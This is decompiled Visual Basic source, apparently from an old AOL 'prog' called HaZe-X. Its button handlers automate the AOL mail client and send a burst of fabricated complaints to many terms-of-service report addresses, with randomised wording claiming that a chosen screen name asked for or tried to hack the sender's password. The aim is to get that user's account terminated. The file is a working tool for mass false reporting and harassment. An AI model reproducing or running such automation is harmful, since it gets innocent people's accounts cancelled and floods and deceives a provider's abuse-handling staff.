subF00 l1026(3), "" & l1020$
l1036$ = Chr(10) + Chr(3)
subF00 l1026(4), "" & Room & ":" & " " & "" & Text1 & l1036$ & l1036$
l1038 = extfn24E0(l102E, "Send")
l103C = extfn2518(l102E, "_AOL_Icon")
l1040 = extfn13D0(l103C, 2)
l1044 = extfn13D0(l1040, 2)
l1048 = extfn1750(l103C, c0074, 0, 0&)
l104C = extfn1750(l103C, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l1050 = 0 To Combo1.ListCount
l1054$ = Combo1.List(l1050)
If  Room = l1054$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub off_Click ()
If  off.Caption = "$IM_OFF" Then
Call sub988
off.Caption = "$IM_ON"
Exit Sub
End If
If  off.Caption = "$IM_ON" Then
Call sub9C0
off.Caption = "$IM_OFF"
Exit Sub
End If
End Sub

Sub oonnn_Click ()
Dim l105C As Variant
Dim l1060 As Variant
Dim l1064 As Variant
Dim l1068 As String
Dim l106A As Variant
Dim l106E() As Integer
Dim l1074 As Integer
Dim l1076 As Variant
Dim l107A As Variant
Dim l107E As String
Dim l1080 As Variant
Dim l1084 As Variant
Dim l1088 As Variant
Dim l108C As Variant
Dim l1090 As Variant
Dim l1094 As Variant
Dim l1098 As Variant
Dim l109C As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l105C = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l1060 = 6
    l1064 = Int(Rnd * l1060 + 1)
      If  l1064 = 1 Then l1068$ = "" & Form1.Room & " asked for my password."
      If  l1064 = 2 Then l1068$ = "" & Form1.Room & " tried to hack my password."
      If  l1064 = 3 Then l1068$ = "Read!" & Form1.Room & " asked for my password."
      If  l1064 = 4 Then l1068$ = "Please do something about " & Form1.Room & "."
      If  l1064 = 5 Then l1068$ = "This guy wants my password:" & Form1.Room
      If  l1064 = 6 Then l1068$ = "Please help " & Form1.Room & " wants my password."
      If  l1064 = 7 Then l1068$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l106A) Like "*KaOS*" Or UCase$(l106A) Like "*NiPP*" Or UCase$(l106A) Like "*CHOP*" Or UCase$(l106A) Like "*LoRe*" Or UCase$(l106A) Like "*CouNT*" Or UCase$(l106A) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • LOTSEN ON"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l1074% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1076 = extfn24E0(l1074%, "Compose Mail")
DoEvents
Loop Until l1076 <> 0
l107A = fn5D0(l106E(), l1076, "*", "_AOL_Edit", Null)
subF00 l106E(1), "Lotsen ON"
subF00 l106E(3), "" & l1068$
l107E$ = Chr(10)
subF00 l106E(4), "" & Room & ":" & " " & "" & Text1 & l107E$ & l107E$
l1080 = extfn24E0(l1076, "Send")
l1084 = extfn2518(l1076, "_AOL_Icon")
l1088 = extfn13D0(l1084, 2)
l108C = extfn13D0(l1088, 2)
l1090 = extfn1750(l1084, c0074, 0, 0&)
l1094 = extfn1750(l1084, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l1098 = 0 To Combo1.ListCount
l109C$ = Combo1.List(l1098)
If  Room = l109C$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub sub4638 ()
Call Command3D3_Click
End Sub

Sub Panel3D8_DragDrop (Source As Control, X As Single, Y As Single)
Call Command3D1_Click
End Sub

Sub Panel3D9_DragDrop (Source As Control, X As Single, Y As Single)
Call Command3D2_Click
End Sub

Sub Rom_Click ()
Form1.Height = 2160
End Sub

Sub secret_Click ()
Dim l10B6 As Variant
Dim l10BA As Variant
Dim l10BE As Variant
Dim l10C2 As String
Dim l10C4 As Variant
Dim l10C8() As Integer
Dim l10CE As Integer
Dim l10D0 As Variant
Dim l10D4 As Variant
Dim l10D8 As String
Dim l10DA As Variant
Dim l10DE As Variant
Dim l10E2 As Variant
Dim l10E6 As Variant
Dim l10EA As Variant
Dim l10EE As Variant
Dim l10F2 As Variant
Dim l10F6 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l10B6 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l10BA = 6
    l10BE = Int(Rnd * l10BA + 1)
      If  l10BE = 1 Then l10C2$ = "" & Form1.Room & " asked for my password."
      If  l10BE = 2 Then l10C2$ = "" & Form1.Room & " tried to hack my password."
      If  l10BE = 3 Then l10C2$ = "Read!" & Form1.Room & " asked for my password."
      If  l10BE = 4 Then l10C2$ = "Please do something about " & Form1.Room & "."
      If  l10BE = 5 Then l10C2$ = "This guy wants my password:" & Form1.Room
      If  l10BE = 6 Then l10C2$ = "Please help " & Form1.Room & " wants my password."
      If  l10BE = 7 Then l10C2$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l10C4) Like "*KaOS*" Or UCase$(l10C4) Like "*NiPP*" Or UCase$(l10C4) Like "*CHOP*" Or UCase$(l10C4) Like "*LoRe*" Or UCase$(l10C4) Like "*CouNT*" Or UCase$(l10C4) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • Secret TOS1"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l10CE% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l10D0 = extfn24E0(l10CE%, "Compose Mail")
DoEvents
Loop Until l10D0 <> 0
l10D4 = fn5D0(l10C8(), l10D0, "*", "_AOL_Edit", Null)
subF00 l10C8(1), "TOSDonC"
subF00 l10C8(3), "" & l10C2$
l10D8$ = Chr(10) + Chr(3)
subF00 l10C8(4), "" & Room & ":" & " " & "" & Text1 & l10D8$ & l10D8$
l10DA = extfn24E0(l10D0, "Send")
l10DE = extfn2518(l10D0, "_AOL_Icon")
l10E2 = extfn13D0(l10DE, 2)
l10E6 = extfn13D0(l10E2, 2)
l10EA = extfn1750(l10DE, c0074, 0, 0&)
l10EE = extfn1750(l10DE, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l10F2 = 0 To Combo1.ListCount
l10F6$ = Combo1.List(l10F2)
If  Room = l10F6$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub secrt2_Click ()
Dim l10F8 As Variant
Dim l10FC As Variant
Dim l1100 As Variant
Dim l1104 As String
Dim l1106 As Variant
Dim l110A() As Integer
Dim l1110 As Integer
Dim l1112 As Variant
Dim l1116 As Variant
Dim l111A As String
Dim l111C As Variant
Dim l1120 As Variant
Dim l1124 As Variant
Dim l1128 As Variant
Dim l112C As Variant
Dim l1130 As Variant
Dim l1134 As Variant
Dim l1138 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l10F8 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l10FC = 6
    l1100 = Int(Rnd * l10FC + 1)
      If  l1100 = 1 Then l1104$ = "" & Form1.Room & " asked for my password."
      If  l1100 = 2 Then l1104$ = "" & Form1.Room & " tried to hack my password."
      If  l1100 = 3 Then l1104$ = "Read!" & Form1.Room & " asked for my password."
      If  l1100 = 4 Then l1104$ = "Please do something about " & Form1.Room & "."
      If  l1100 = 5 Then l1104$ = "This guy wants my password:" & Form1.Room
      If  l1100 = 6 Then l1104$ = "Please help " & Form1.Room & " wants my password."
      If  l1100 = 7 Then l1104$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l1106) Like "*KaOS*" Or UCase$(l1106) Like "*NiPP*" Or UCase$(l1106) Like "*CHOP*" Or UCase$(l1106) Like "*LoRe*" Or UCase$(l1106) Like "*CouNT*" Or UCase$(l1106) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • Secret TOS2"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l1110% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1112 = extfn24E0(l1110%, "Compose Mail")
DoEvents
Loop Until l1112 <> 0
l1116 = fn5D0(l110A(), l1112, "*", "_AOL_Edit", Null)
subF00 l110A(1), "TOSChrisD"
subF00 l110A(3), "" & l1104$
l111A$ = Chr(10) + Chr(3)
subF00 l110A(4), "" & Room & ":" & " " & "" & Text1 & l111A$ & l111A$
l111C = extfn24E0(l1112, "Send")
l1120 = extfn2518(l1112, "_AOL_Icon")
l1124 = extfn13D0(l1120, 2)
l1128 = extfn13D0(l1124, 2)
l112C = extfn1750(l1120, c0074, 0, 0&)
l1130 = extfn1750(l1120, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l1134 = 0 To Combo1.ListCount
l1138$ = Combo1.List(l1134)
If  Room = l1138$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub sem_Click ()
Dim l113A As Variant
Dim l113E As Variant
Dim l1142 As Variant
Dim l1146 As String
Dim l1148 As Variant
Dim l114C() As Integer
Dim l1152 As Integer
Dim l1154 As Variant
Dim l1158 As Variant
Dim l115C As String
Dim l115E As Variant
Dim l1162 As Variant
Dim l1166 As Variant
Dim l116A As Variant
Dim l116E As Variant
Dim l1172 As Variant
Dim l1176 As Variant
Dim l117A As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l113A = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l113E = 6
    l1142 = Int(Rnd * l113E + 1)
      If  l1142 = 1 Then l1146$ = "" & Form1.Room & " asked for my password."
      If  l1142 = 2 Then l1146$ = "" & Form1.Room & " tried to hack my password."
      If  l1142 = 3 Then l1146$ = "Read!" & Form1.Room & " asked for my password."
      If  l1142 = 4 Then l1146$ = "Please do something about " & Form1.Room & "."
      If  l1142 = 5 Then l1146$ = "This guy wants my password:" & Form1.Room
      If  l1142 = 6 Then l1146$ = "Please help " & Form1.Room & " wants my password."
      If  l1142 = 7 Then l1146$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l1148) Like "*KaOS*" Or UCase$(l1148) Like "*NiPP*" Or UCase$(l1148) Like "*CHOP*" Or UCase$(l1148) Like "*LoRe*" Or UCase$(l1148) Like "*CouNT*" Or UCase$(l1148) Like "*SoSo*" Or UCase$(l1148) Like "*TaLoN*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • Super E-Mail"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TOSEmail2"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSEmail2 Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TOSEmail3"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSEmail3 Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TOSFileWrn"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSFileWrn Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TOSGFX10"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSGFX10 Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TOSFiles1"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSFiles1 Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TOS IM1"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOS IM1 Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TOSStaff1"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSStaff1 Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TOSBoards1"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSBoards1 Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TOSNames1"
subF00 l114C(3), "" & l1146$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSNames1 Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "LOTSEN"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • LOTSEN Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "LOTSEN MI"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • LOTSEN MI Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TOSChrisD"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Secret TOS Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TOSDonC"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Secret TOS2 Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TOSprofile "
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSProfile Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TROUBLE"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TROUBLE Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "TOSIRC"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSIRC Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "VLA"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • VLA Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "CGU France"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • CGU France Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "COSRoomsDE"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • COSRoomsDE Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "LOTSEN HO"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • LOTSEN HO Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "Lotsen ON"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • LOTSEN ON Completed."
subF38 .3#
l1152% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
